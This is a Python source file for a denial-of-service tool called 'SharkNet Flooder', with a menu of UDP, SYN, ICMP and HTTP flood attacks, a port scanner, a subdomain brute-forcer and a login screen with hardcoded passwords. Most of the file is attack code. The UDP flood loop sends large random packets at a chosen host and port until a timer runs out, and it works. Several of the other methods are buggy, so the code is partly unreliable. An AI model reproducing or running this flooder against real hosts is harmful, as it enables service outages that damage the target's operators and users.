#!/usr/bin/env python3
#-*- coding: utf-8 -*-
# Code by Sword
# It's simple python script flooder with same interface as SharkNet Botnet (SharkNet Botnet by me = https://www.youtube.com/watch?v=AbP6vGFkEP4&t=69s)

#+---------------------------------------------------------------------+
#+   Importation des différentes bibliothèques utiles pour le script   +
#+---------------------------------------------------------------------+

import sys
import socket
import time
import random
import threading
import getpass
import os

#+---------------------------------------------------------------------+
#+            left = petit logo à côté de la zone de saisie            +
#+---------------------------------------------------------------------+

left = "\033[96mRoot\033[00m@\033[91mSharkNet\033[91m 🦈\033[00m "
top = "\x1b]2;Connected as: Root | SharkNet \x07"
topstart ="\x1b]2;Welcome to SharkNet Flooder DOS\x07"
commentattack = """\033[91m 🦈\033[96m Command sent !"""

sys.stdout.write(top)
def modifications():
	print ("\033[96mContact \033[91mSword \033[96mthe script is currently under maitnance")
	on_enter = input("Please press enter to leave")
	exit()

#+---------------------------------------------------------------------+
#+ methods = block pour afficher à l'utilisateur les méthodes          +
#+---------------------------------------------------------------------+

method = """
\033[00m \033[96m-> Methods Attacks \033[91mSharkNet 🦈 <-\033[00m  
╔═══════════════════════════════════════════╗
║ \033[91m.udp  \033[96m[HOST] [PORT] [TIMEOUT]             \033[00m║
║ \033[91m.syn  \033[96m[HOST] [PORT] [TIMEOUT]             \033[00m║
║ \033[91m.http  \033[96m[HOST] [PORT] [TIMEOUT]            \033[00m║
║ \033[91m.icmp \033[96m[HOST] [PORT] [TIMEOUT]             \033[00m║
╚═══════════════════════════════════════════╝\033[00m
"""

version = "1.0"

#+---------------------------------------------------------------------+
#+ help = block pour afficher à l'utilisateur les commandes disponnible+
#+---------------------------------------------------------------------+

help = """
\033[00m \033[96m-> Basic Commands for \033[91mSharkNet 🦈 <-\033[00m  
╔═══════════════════════════════════════════════╗
║ \033[91m?               \033[00m| \033[96m METHODS ATTACKS            \033[00m║
║ \033[91mversion         \033[00m| \033[96m SHOW VERSION               \033[00m║
║ \033[91mtools           \033[00m| \033[96m COMMANDS TOOLS             \033[00m║
║ \033[91mstats           \033[00m| \033[96m SHOW RUNNING ATTACKS       \033[00m║
║ \033[91mstopattacks     \033[00m| \033[96m FOR STOP ALL ATTACKS       \033[00m║
║ \033[91mclr             \033[00m| \033[96m FOR CLEAR THE TERMINAL     \033[00m║
║ \033[91mupdates         \033[00m| \033[96m PATCH NOTES                \033[00m║
║ \033[91mlogout          \033[00m| \033[96m FOR QUIT                   \033[00m║
╚═══════════════════════════════════════════════╝\033[00m
"""

#+---------------------------------------------------------------------+
#  tools = block pour afficher à l'utilisateur les outils (c'est tools +
#   ne sont pas codé entièrment par moi, j'ai fait des recherches pour +
#           pouvoir avoir quelque chose de potable)                    +
#+---------------------------------------------------------------------+

tools = """\033[00m
\033[00m \033[96m-> Commands Tools \033[91mSharkNet 🦈 <-\033[00m  
╔═══════════════════════════════════════════════════════╗
║ \033[91mstopattacks                   \033[00m|\033[96m STOP ALL ATTACKS\033[00m      ║
║ \033[91mattacks                       \033[00m|\033[96m RUNNING ATTACKS\033[00m       ║
║ \033[91mping [HOST]                   \033[00m|\033[96m PING A HOST\033[00m           ║
║ \033[91mresolve [HOST]                \033[00m|\033[96m GRAB A DOMIANS IP\033[00m     ║
║ \033[91mportscan [HOST] [RANGE]       \033[00m|\033[96m PORTSCAN A HOST  \033[00m     ║
║ \033[91mdnsresolve [HOST]             \033[00m|\033[96m GRAB ALL SUB-DOMAINS\033[00m  ║
║ \033[91mstats                         \033[00m|\033[96m DISPLAY DEMONNET STATS\033[00m║
╚═══════════════════════════════════════════════════════╝\033[00m
"""

#+---------------------------------------------------------------------+
#+ updatenotes = block pour afficher le patchnote                      +
#+---------------------------------------------------------------------+

updatenotes = """\033[91m
\033[00m \033[96m-> Patch Notes of \033[91mSharkNet 🦈 <-\033[00m 
╔══════════════════════════════════════════════════════╗
║ \033[96m- Better ascii menu if you don't use a lite version\033[00m  ║
║ \033[96m- New Methods\033[00m                                        ║
║ \033[96m- Updated attack methods\033[00m                             ║
║ \033[96m- Background attacks\033[00m                                 ║
║ \033[96m- Running Stats displayer\033[00m                            ║
║ \033[96m- New Tools\033[00m                                          ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

#+---------------------------------------------------------------------+
#+ stat = pour voir les attaques lancées                               +                    
#+---------------------------------------------------------------------+

statz = """
\033[00m- Attacks: \033[91m0                                       
\033[00m- Found Domains: \033[91m0                                  
\033[00m- PINGS: \033[91m0                                          
\033[00m- PORTSCANS: \033[91m0                                      
\033[00m- GRABBED IPS: \033[91m0                                 
"""

#+---------------------------------------------------------------------+
#+   banner = arrière plan du script quand on est menu principale      +
#+---------------------------------------------------------------------+

banner = """\033[1;00m\033[91m                                                  		
\033[91m                  _ _             _   _  _     _   				
\033[91m               / __| |_  __ _ _ _| |_| \| |___| |_ 				
\033[91m               \__ \ ' \/ _` | '_| / / .` / -_)  _|				
\033[91m               |___/_||_\__,_|_| |_\_\_|\_\___|\__|                 
					
\033[96m        Successfully Loggin to \033[91mSharkNet 🦈\033[96m by Sword
\033[96m        Simple script flooder with same interface as SharkNet Botnet
\033[96m        Connected As : \033[91mRoot
\033[96m        Type \033[91m? \033[96mfor methods\033[96m	

"""

altbanner = """\033[1;00m\033[91m                                                  		
\033[91m                  _ _             _   _  _     _   				
\033[91m               / __| |_  __ _ _ _| |_| \| |___| |_ 				
\033[91m               \__ \ ' \/ _` | '_| / / .` / -_)  _|				
\033[91m               |___/_||_\__,_|_| |_\_\_|\_\___|\__|                 
					
\033[96m        Successfully Loggin to \033[91mSharkNet 🦈\033[96m by Sword
\033[96m        Simple script flooder with same interface as SharkNet Botnet
\033[96m        Connected As : \033[91mRoot
\033[96m        Type \033[91m? \033[96mfor methods\033[96m	

"""

#+---------------------------------------------------------------------+
#+   banner = arrière plan du script lors de son lancement             +
#+---------------------------------------------------------------------+

start = """\033[1;00m\033[96m 
 __      _____ _    ___ ___  __  __ ___                         
 \ \    / / __| |  / __/ _ \|  \/  | __|                        
  \ \/\/ /| _|| |_| (_| (_) | |\/| | _|                         
   \_/\_/ |___|____\___\___/|_|  |_|___|                        
                 |_   _/ _ \                                   
                   | || (_) | 
	        \033[96mFlooder By \033[91mSword\033[96m                                   
                   |_| \___/_  _   _   ___ _  ___  _ ___ _____  
                       / __| || | /_\ | _ \ |/ / \| | __|_   _| 
                       \__ \ __ |/ _ \|   / ' <| .` | _|  | |   
                       |___/_||_/_/ \_\_|_\_|\_\_|\_|___| |_| 

"""

#+---------------------------------------------------------------------+
#+   Création des compteurs                                            +
#+---------------------------------------------------------------------+

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


#+---------------------------------------------------------------------+
#+   fonction pour les attaques (pas développé entièrement par moi)    +
#+---------------------------------------------------------------------+

def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1

#+---------------------------------------------------------------------+
#   Fonction principale qui sera appela et qui effectura une boucle    +
#      infinie pour ensuite rélever les commandes de l'utilistaeur     + 
#                avec simplement des conditions                        +
#+---------------------------------------------------------------------+

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write(top)
		sin = input(left).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clr":
			os.system ("clear")
			print (altbanner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "":
			main()
		elif sinput == "logout":
			exit()
		elif sinput == "version":
			print ("\033[91mSharkNet \033[96mversion: "+version+" ")
		elif sinput == "stats":
			print (statz)
			main()
		elif sinput == "?":
			print (method)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "portscan":
			port_range = int(sin.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print (left.format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "attacks":
			print ("\n[\033[91mSharkNet\033[00m] UPD Running processes: {}".format (uaid))
			print ("[\033[91mSharkNet\033[00m] ICMP Running processes: {}".format (iaid))
			print ("[\033[91mSharkNet\033[00m] SYN Running processes: {}".format (said))
			print ("[\033[91mSharkNet\033[00m] Total attacks running: {}\n".format (aid))
			main()
		elif sinput == "dnsresolve":
			sfound = 0
			sys.stdout.write(top.format (sfound))
			try:
				host = sin.split(" ")[1]
				with open(r"/usr/share/nxstro/domaines.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print (left, "Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write(top.format (sfound))
					except socket.error:
						pass
				print (left, "Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print (left, "Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print (left, "Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print (left, "Host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write(top.format (stop))
						print ("SharkNet: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;SharkNet | Connected as: Root \x07")
						print ("SharkNet: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print (left, "The command {} requires an argument".format (sinput))
				main()
		elif sinput == ".udp":
			if username == "guests":
				print (left, "You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					print (commentattack, "{}".format (host))
					punch = random._urandom(int(65500))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print (left, "The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print (left, "Host: {} invalid".format (host))
					main()

		elif sinput == ".dns":
			if username == "guests":
				print (left, "You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					print (commentattack, "{}".format (host))
					punch = random._urandom(int(65500))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print (left, "The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print (left, "Host: {} invalid".format (host))
					main()

		elif sinput == ".udpplain":
			if username == "guests":
				print (left, "You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					print (commentattack, "{}".format (host))
					punch = random._urandom(int(65500))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print (left, "The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print (left, "Host: {} invalid".format (host))
					main()			

		elif sinput == ".http":
			try:
				sinput, host ,port, timer = sin.split(" ")
				socket.gethostbyname(host)
				print (commentattack,"{}".format (host))
				punch = random._urandom(int(65500))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print (left, "The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print (left, "{} invalid".format (host))
				main()
		elif sinput == ".icmp":
			if username == "guests":
				print (left, "You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					print (commentattack,"{}".format (host))
					punch = random._urandom(int(65500))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print (left, "The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print (left, "Host: {} invalid".format (host))
					main()
		elif sinput == ".syn":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				print (commentattack, "{}".format (host))
				punch = random._urandom(int(65500))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print (left, "The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print (left, "{} invalid".format (host))
				main()

		elif sinput == ".ovh":
			try:
				sinput, host, port, timer = sin.split(" ")
				print ("\033[96mIn development, available for the next \033[91mupdate")
			except ValueError:
				print (left, "The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print (left, "{} invalid".format (host))
				main()

		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print (left, "No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print (left, "No ICMP processes running")
					udp = True
					main()
		else:
			print (left, "{} Not a command".format(sinput))
			main()

#+---------------------------------------------------------------------+
#+     Block de connection avec un simple system de condition          +
#+---------------------------------------------------------------------+

try:
	users = ["Root"]
	clear = "clear"
	os.system (clear)
	sys.stdout.write(topstart)
	print (start)
	username = getpass.getpass ("\033[96mUsername \033[96m:\033[91m ")
	if username in users:
		user = username
	else:
		print ("\033[91mWRONG USERNAME")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["root", "azerty1337"]
	password = getpass.getpass ("\033[96mPassword \033[96m:\033[91m ")
	if user == "Root":
		if password == passwords[0]:
			print ("\033[91mLOGIN SUCCESSFULLY\033[91m ")
			time.sleep(2)
			print ("\033[96mType \033[91mhelp \033[96mfor start\033[91m ")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print (left, "CTRL has been pressed")
				main()
		else:
			print ("\033[91mWRONG PASSWORD")
			exit()
except KeyboardInterrupt:
	exit()
